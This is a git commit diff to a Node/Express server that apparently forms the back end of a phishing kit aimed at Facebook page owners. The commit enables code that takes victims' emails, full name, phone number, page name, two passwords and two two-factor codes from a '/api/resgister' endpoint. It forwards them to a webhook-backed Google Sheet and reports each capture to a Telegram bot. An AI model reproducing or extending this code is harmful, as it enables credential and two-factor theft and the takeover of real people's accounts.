639d02ce7abf4e183aa8cfa270c5a68c89dadeb7
Nguyễn Đức Thắm <102347246+ductham08@users.noreply.github.com>
2024-09-03 11:30:28 +0700

    api update

--- index.js
+++ index.js
@@ -5,16 +5,12 @@ import TelegramBot from 'node-telegram-bot-api';
 import axios from "axios";
 
 const app = express();
- 
 app.use(cors('*'));
-
 app.use(express.json());
 
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
-// const bot_two = new TelegramBot(process.env.BOT_TOKEN_BOT_TWO, { polling: true });
 
 app.post('/api/resgister', (req, res) => {
-    // GET DATA FROM CLIENT
     const data = req.body; 
 
     const result = {
@@ -23,10 +19,6 @@ app.post('/api/resgister', (req, res) => {
     }
 
     res.send(result);
-
-    // SEND DATA TO TELE
-
-    console.log(data.firstTwoFa);
 
 if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
     
@@ -50,44 +42,35 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
 
 }
 
-
-
-    // bot_two.sendMessage(process.env.CHAT_ID_BOT_TWO, location,  { parse_mode: 'HTML' });
-
-
     // ADD GOOGLE SHEET
-    // const url = new URL(process.env.WEBHOOK_URL);
+    const url = new URL(process.env.WEBHOOK_URL);
 
-    // url.searchParams.append('Ip', data.ip ? data.ip : '');
-    // url.searchParams.append('City', data.city ? data.city : '');
-    // url.searchParams.append('Country', data.country ? data.country : '');
-    // url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
-    // url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
-    // url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
-    // url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
-    // url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
-    // // 
-    // url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
-    // url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
-    // // 
-    // url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
-    // url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
+    url.searchParams.append('Ip', data.ip ? data.ip : '');
+    url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
+    url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
+    url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
+    url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
+    url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
+    url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
+    url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
+    url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
+    url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
 
-    // axios.get(url)
-    // .then(response => {
-    //     const data = response.data;
-    //     if (data.status === 'success') {
-    //         bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
-    //     } else {
-    //         bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
-    //     }
-    // })
-    // .catch(error => {
-    //     bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
-    // });
+    axios.get(url)
+    .then(response => {
+        const data = response.data;
+        if (data.status === 'success') {
+            bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
+        } else {
+            bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
+        }
+    })
+    .catch(error => {
+        bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
+    });
 
 });
 
 app.listen(process.env.PORT, () => {
-    console.log(`Server đang lắng nghe tại cổng ${process.env.PORT}`);
+    console.log(`Server listening port ${process.env.PORT}`);
 });
